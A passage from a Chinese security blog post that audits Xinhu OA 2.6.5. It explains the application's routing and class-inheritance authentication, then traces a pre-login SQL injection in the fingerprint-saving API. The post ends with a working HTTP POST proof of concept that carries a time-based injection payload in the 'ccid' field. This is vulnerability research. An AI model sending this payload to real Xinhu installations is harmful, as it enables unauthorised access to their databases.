class="hljs-variable">$s</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">xssrepstr</span>(<span class="hljs-variable">$s</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">reteistrs</span>(<span class="hljs-variable">$s</span>);<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里我们主要看的是$s和$na的值所受的影响。</p>
+<p>首先将$s给强制类型转换成字符串，然后就是根据$lx的值对$s进行不同的处理，这里就不解释了，其实也跳转不到if分支里面，get函数里，将$lx定义为0了。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507121936550.png" srcset="/img/loading.gif" lazyload alt="image-20250712193633475"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507121937302.png" srcset="/img/loading.gif" lazyload alt="image-20250712193715167"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507121938324.png" srcset="/img/loading.gif" lazyload alt="image-20250712193848182"></p>
+<p>后面这一段就是对参数值做一个校验的，防止sql注入和xss的。</p>
+<p>总结一下：get方法的第一个参数是可控的，由get方法传进，并对传进去的内容做了sql注入和xss的防御。</p>
+<p>接着分析，如果$_uurl不为空的话，就清除m,d,a，将$_uurl赋值给$m，以_作为数组的分隔符，将不同的下标所对应的值赋值给$d，$m，$a。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507121946871.png" srcset="/img/loading.gif" lazyload alt="image-20250712194645714"></p>
+<p>后面的逻辑是一样的，这段不太重要，抓登录包就知道了，$_uurl一般是为空的。</p>
+<p>重点看下面的逻辑。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507121948625.png" srcset="/img/loading.gif" lazyload alt="image-20250712194837469"></p>
+<p>这个gettoken跟不进去的话，有两种方法，一种是打断点，动态调试跟进，另外一种是全局搜索函数gettoken，找有jm的，因为是jm所调用的。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507121950123.png" srcset="/img/loading.gif" lazyload alt="image-20250712195032022"></p>
+<p>打断点跟进的也是jmChajian这个文件。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507121953047.png" srcset="/img/loading.gif" lazyload alt="image-20250712195354893"></p>
+<p>这的逻辑先是将$dev赋值给$s，如果遇见rocktokenarr[‘$na’]这样的数组，就将它的值赋值给$s，否则的话还是调用get函数，并赋值给$s，又回到上面的逻辑了。</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xl">$<span class="hljs-function"><span class="hljs-title">m</span>			= $rock-&gt;</span><span class="hljs-function"><span class="hljs-title">jm</span>-&gt;</span>gettoken(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;index&#x27;</span>);<br>$<span class="hljs-function"><span class="hljs-title">d</span>			= $rock-&gt;</span><span class="hljs-function"><span class="hljs-title">jm</span>-&gt;</span>gettoken(<span class="hljs-string">&#x27;d&#x27;</span>);<br>$<span class="hljs-function"><span class="hljs-title">a</span>			= $rock-&gt;</span><span class="hljs-function"><span class="hljs-title">jm</span>-&gt;</span>gettoken(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;default&#x27;</span>);<br>上面m，d，a都不传值的话，默认的值就是index，空的，default<br></code></pre></td></tr></table></figure>
+
+<p>最后包含了view.php 这个才是路由分析的具体。</p>
+<p>view.php:</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507122003222.png" srcset="/img/loading.gif" lazyload alt="image-20250712200331110"></p>
+<p>get传参ajaxbool，这里刚开始的$ajaxbool最后是true，因为false是以字符串传进去的。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507122006927.png" srcset="/img/loading.gif" lazyload alt="image-20250712200637806"></p>
+<p>$p是固定的webmain。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507122007702.png" srcset="/img/loading.gif" lazyload alt="image-20250712200736557"></p>
+<p>m,a,d没get传递的话，都会给一个默认的值，这里除了P是固定的，其他都是可控的。</p>
+<p>下面是一个重点的逻辑：</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507122009092.png" srcset="/img/loading.gif" lazyload alt="image-20250712200925016"></p>
+<p>将$m的值赋值给$_m，如果m传入的是123|abc这种形式的话，那么123就是<code>$m</code>的值，abc就是<code>$_m</code>的值。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">strformat(<span class="hljs-string">&#x27;?0/?1/?1Action.php&#x27;</span>,<span class="hljs-variable constant_">ROOT_PATH</span>, <span class="hljs-variable">$p</span>));   <span class="hljs-regexp">//</span><span class="hljs-variable constant_">ROOT_PATH</span>对应的是/  <span class="hljs-variable">$p</span>对应的是webmain  <span class="hljs-string">?0</span>则是<span class="hljs-variable constant_">ROOT_PATH</span> <span class="hljs-string">?1</span>则是webmain 至于第二个<span class="hljs-string">?1</span> 也是webmain<br></code></pre></td></tr></table></figure>
+
+<p>这个包含的其实是：</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507122015394.png" srcset="/img/loading.gif" lazyload alt="image-20250712201509327"></p>
+<p>webmainAction.php这个文件。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$actpath</span>	= <span class="hljs-variable">$rock</span>-&gt;strformat(<span class="hljs-string">&#x27;?0/?1/?2?3&#x27;</span>,ROOT_PATH, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$d</span>, <span class="hljs-variable">$_m</span>);  ?<span class="hljs-number">0</span>=&gt;/  ?<span class="hljs-number">1</span>=&gt;webmain  ?<span class="hljs-number">2</span>=&gt;d传进去的值，其实也就是webmain下的文件的名字  ?<span class="hljs-number">3</span>=&gt;<span class="hljs-variable">$_m</span> 即对应文件夹的名字，也对应着文件名<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507122018944.png" srcset="/img/loading.gif" lazyload alt="image-20250712201812805"></p>
+<p>a则对应的是具体的函数，当$ajaxbool是真的时候，对应的是Ajax的方法，反之对应的是Action的方法。</p>
+<p>举一个例子方便理解：</p>
+<p>就拿我们登录抓的包来说</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507122020342.png" srcset="/img/loading.gif" lazyload alt="image-20250712202056251"></p>
+<p>这里$m是login，其实也就是$_m也是login 对应的是webmain下的login文件夹下的loginAction.php</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507122023466.png" srcset="/img/loading.gif" lazyload alt="image-20250712202326359"></p>
+<p>a对应的是check，并且ajaxbool=true</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507122025821.png" srcset="/img/loading.gif" lazyload alt="image-20250712202506578"></p>
+<p>如果是多个文件夹呢，这时候就要传入d以及m传入xxx|xxx了。</p>
+<p>举个例子：</p>
+<p>访问webmain/task/api/reimAction.php下的getrecordAction 函数。</p>
+<p>传参如下：</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">?a=getrecord<span class="hljs-variable">&amp;d</span>=task<span class="hljs-variable">&amp;m</span>=reim|api<span class="hljs-variable">&amp;ajaxbool</span>=false<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507122029349.png" srcset="/img/loading.gif" lazyload alt="image-20250712202917248"></p>
+<p>上面是未登录的状态，看一下登录之后的情况。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507122030765.png" srcset="/img/loading.gif" lazyload alt="image-20250712203004633"></p>
+<h2 id="鉴权分析"><a href="#鉴权分析" class="headerlink" title="鉴权分析"></a>鉴权分析</h2><p> 主要看webmain下的文件信息，这个OA是继承父类的方法来鉴权的。</p>
+<p>主要有三个父类：</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">apiAction</span><br><span class="hljs-attribute">Action</span><br><span class="hljs-attribute">openapiAction</span><br></code></pre></td></tr></table></figure>
+
+<p>首先我们来看apiAction的。</p>
+<p>找一个继承类是apiAction的文件来分析一下。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507142300334.png" srcset="/img/loading.gif" lazyload alt="image-20250714230023183"></p>
+<p>deptClassAction是apiAction的一个子类，继承了这个父类里面的方法，如果我们直接去访问deptClassAction.php下的某一方法的话，是访问不到的，具体原因我们跟进apiAction</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507142303459.png" srcset="/img/loading.gif" lazyload alt="image-20250714230306308"></p>
+<p>apiAction下的initAction方法是用来进行鉴权的。这里就不详细解释了，然后再跟进到最终的父类。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507142339175.png" srcset="/img/loading.gif" lazyload alt="image-20250714233923811"></p>
+<p>这里会自动触发initAction方法。</p>
+<p>openapiAction的话和apiAction是一样的，都是initAction方法进行鉴权，只不过方法内容不一样。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507142349619.png" srcset="/img/loading.gif" lazyload alt="image-20250714234914533"></p>
+<p>主要对传入的openkey的值和数据库里面的值做比较。</p>
+<p>Action方法来跟进一下。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507142351997.png" srcset="/img/loading.gif" lazyload alt="image-20250714235118679"></p>
+<p>跟进Action以及它的父类。</p>
+<p>Action是利用initProject进行鉴权的。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507142359318.png" srcset="/img/loading.gif" lazyload alt="image-20250714235946226"></p>
+<p>跟进最终的父类发现_construct方法里面存在initProject()，最终也会自动触发。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507150002506.png" srcset="/img/loading.gif" lazyload alt="image-20250715000208247"></p>
+<p>这种继承的方法，如果子类和父类里面有相同的方法，最终执行的是子类的方法。</p>
+<p>所以如果子类重写了鉴权对应的函数，最终执行的是它重写的，而不是父类里面用来鉴权的。</p>
+<p>举个例子：</p>
+<p>我自己写一个新的initAction方法，然后再创建一个方法，作为验证</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507150023672.png" srcset="/img/loading.gif" lazyload alt="image-20250715002349558"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507150024929.png" srcset="/img/loading.gif" lazyload alt="image-20250715002426706"></p>
+<p>可以看到能够访问到，所以找未授权的就看那些有重写方法的。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞点再webmain/model/kqjcmdModel.php下的savefingerprint函数。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172206361.png" srcset="/img/loading.gif" lazyload alt="image-20250717220607219"></p>
+<p>主要是$snid和$uid这两个参数查看是否是可控的，最终rows这个函数会执行$where这个语句。</p>
+<p>跟进一下看看，主要是查看都哪里调用了这个方法。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172214126.png" srcset="/img/loading.gif" lazyload alt="image-20250717221431031"></p>
+<p>第二个调用的跟到最后它是不可控的。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172220276.png" srcset="/img/loading.gif" lazyload alt="image-20250717222016135"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172220083.png" srcset="/img/loading.gif" lazyload alt="image-20250717222038969"></p>
+<p>经过分析得知，$clarr是从数据库中得到信息，并不可控。</p>
+<p>下面是第一个调用的跟进。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172222468.png" srcset="/img/loading.gif" lazyload alt="image-20250717222208406"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172222814.png" srcset="/img/loading.gif" lazyload alt="image-20250717222254684"></p>
+<p>接着查看哪里调用了postdata这个方法，然后主要是看第二个参数。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172224915.png" srcset="/img/loading.gif" lazyload alt="image-20250717222449826"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172225475.png" srcset="/img/loading.gif" lazyload alt="image-20250717222545349"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172226917.png" srcset="/img/loading.gif" lazyload alt="image-20250717222602808"></p>
+<p>这里跟进这个地方。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172226273.png" srcset="/img/loading.gif" lazyload alt="image-20250717222633155"></p>
+<p>从POST中传递参数，进行接收，然后又查看哪里调用了getpostdata，刚好再webmain/task/openapi/openkqjAction.php下的initAction方法中，这个也刚好是父类用来鉴权的，这里重写了，所以能造成前台的sql注入。</p>
+<p>综上可知$uid是可控的，而$snid虽然能自己手动传入，但最后做了一个int转换。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172329077.png" srcset="/img/loading.gif" lazyload alt="image-20250717232859938"></p>
+<p>调用流程图如下：</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172253803.png" srcset="/img/loading.gif" lazyload alt="image-20250717225343634"></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php?a=api&amp;m=openkqj|openapi&amp;d=task&amp;sn=1&amp;/post</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xinhu:8087<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>deviceid=1751808088555; xinhu_ca_adminuser=admin; xinhu_ca_rempass=0; xinhu_mo_adminid=kp0gl0lsd0lsp0wk0gs0kp0llk0ws0lls0pe0lsd0kw0kl0kj0gp06; PHPSESSID=7kmpgcidv5vm5sdm89mq3i51d6<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>73<br><br><span class="language-css">&#123;&quot;<span class="hljs-selector-tag">b</span>&quot;:&#123;&quot;data&quot;:<span class="hljs-string">&quot;fingerprint&quot;</span>,<span class="hljs-string">&quot;ccid&quot;</span>:<span class="hljs-string">&quot;a&#x27; or sleep(2)#&#x27;&quot;</span>,<span class="hljs-string">&quot;fingerprint&quot;</span>:<span class="hljs-string">&quot;xx&quot;</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>注意这里需要将Content-Type改为application/json</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172302539.png" srcset="/img/loading.gif" lazyload alt="image-20250717230244433"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172303134.png" srcset="/img/loading.gif" lazyload alt="image-20250717230320996"></p>
+<p>那么接下来，就是一些比较细节的东西了。</p>
+<p>路由：</p>
+<p>这个路由就不再多说了，提一点的就是后面为什么要加一个/post,这个是为了进行满足if条件。</p>
+<p>这个下面自己验证一下，没啥好说的。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172331467.png" srcset="/img/loading.gif" lazyload alt="image-20250717233102360"></p>
+<p>然后就是post传递什么？</p>
+<p>它需要满足if条件：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(<span class="hljs-variable">$dtype</span>==<span class="hljs-string">&#x27;fingerprint&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">$dtype = arrvalue($rs, <span class="hljs-string">&#x27;data&#x27;</span>);  这个则相当于是$rs是键名，取得是键名是<span class="hljs-built_in">data</span>所对应的值<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">foreach</span><span class="hljs-params">(<span class="hljs-variable">$barr</span> as <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$rs</span>)</span></span> 由于它有这个，相当于需要传递两层的json才可以<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172353095.png" srcset="/img/loading.gif" lazyload alt="image-20250717235314885"></p>
+<p>后面的就不难理解了，就是传入ccid，然后这个参数有sql注入。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="category-chain-item">代码审计</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E4%BF%A1%E5%91%BCOA/" class="print-no-link">#信呼OA</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>信呼OA前台sql注入分析</div>
+      <div>http://example.com/2025/05/31/信呼OA_2.6.5前台sql注入分析/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>FSRM</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年5月31日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年7月18日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/05/25/HTB-Fluffy/" title="HTB-Fluffy">
+                        <span class="hidden-mobile">HTB-Fluffy</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"uIHnq7AMZzxGr67001Hi4rIt-gzGzoHsz","appKey":"dXTOT6Pscxry6haYWYds2nMd","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
